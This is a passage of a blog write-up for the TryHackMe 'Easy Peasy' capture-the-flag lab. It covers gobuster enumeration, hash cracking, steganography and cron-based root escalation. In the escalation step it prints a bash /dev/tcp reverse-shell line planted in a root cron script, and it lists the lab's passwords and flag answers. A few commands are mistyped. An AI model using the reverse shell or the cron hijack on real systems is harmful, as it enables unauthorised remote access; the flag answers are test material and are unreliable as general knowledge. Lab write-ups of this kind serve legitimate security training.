+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>
+
+<p><br></p>
+
+<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>
+
+<p>The highest port is 65524.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>
+
+<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>
+
+<p><br></p>
+
+<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>
+
+<p>I’m visiting the site running on port 80 and I see such a page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home"></p>
+
+<p>I checked the source page but couldn’t find anything remarkable.</p>
+
+<p>Let’s do a gobuster scan and see if we can find anything.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one"></p>
+
+<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever"></p>
+
+<p>Nothing appears on the page. Let’s look at the source page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode"></p>
+
+<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{f1rs7_fl4g}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>
+
+<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>
+
+<p>Let’s look at the type of hash with hash-identifer.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots"></p>
+
+<p>We found the type MD5. Let’s crack it.</p>
+
+<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash" rel="external nofollow noopener" target="_blank">Here</a></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots"></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{1m_s3c0nd_fl4g}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>
+
+<p>When we take a look at Apache, something remarkable emerges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3"></p>
+
+<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>
+
+<p>When we go to the source page of the Apache page, we see something like this.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source"></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>
+
+<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/" rel="external nofollow noopener" target="_blank">Cyber Chef</a>.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>
+
+<p><br></p>
+
+<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
+<p>what is the password?</p>
+
+<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>
+
+<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/" rel="external nofollow noopener" target="_blank">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict"></p>
+
+<p>Let’s check the source of the page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source"></p>
+
+<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
+
+<p>First I look at the type with hash-identifier.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id"></p>
+
+<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: mypasswordforthatjob</code></strong></p>
+
+<p><br></p>
+
+<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source"></p>
+
+<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+$ steghide extract -sf binarycodepixabay.jpg
+$ cat secrettext.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext"></p>
+
+<p>We found the username and password.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>
+
+<p>Let’s crack the encrypted password first.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>
+
+<p><br></p>
+
+<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>
+
+<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin"></p>
+
+<p>And we are inside. Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag"></p>
+
+<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{a0jvgf33zfa0ez4y}</code></strong>. Let’s crack it.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{n0wits33msn0rm4l}</code></strong></p>
+
+<p><br></p>
+
+<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>
+
+<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron"></p>
+
+<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>
+
+<p>First, let’s set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Let’s change the file on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob"></p>
+
+<p>After waiting for a while, we get root privileges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in"></p>
+
+<p>Yes, we have root privileges. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag"></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{63a9f0ea7bb98050796b649e85481845}</code></strong></p>
+
+<p><br></p>
+
+<hr>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 24, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">nmap,</span>
+          
+          <span class="post__tags-item">gobuster,</span>
+          
+          <span class="post__tags-item">cronjob</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-easy-peasy/';
+    this.page.identifier = '/tryhackme-easy-peasy';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+    </div>
+
+
+
+
+    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
+    <footer>
+  <div class="footer">
+    © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
+  </div>
+</footer>
+
+    <!-- script -->
+    <script src="/assets/js/nav.js"></script>
+    <script src="/assets/js/clip.js"></script>
+    <script src="/assets/js/scroll-top.js"></script>
+    <script src="/assets/js/search.js"></script>
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "TryHackMe - Easy Peasy",
+    "author": {
+      "@type": "Person",
+      "name": ""
+    },
+    "datePublished": "2023-03-24 00:00:00 +0300",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http://localhost:4000/tryhackme-easy-peasy/"
+    },
+    "articleSection": "TryHackMe"
+  }
+</script>
+  </body>
+</html>
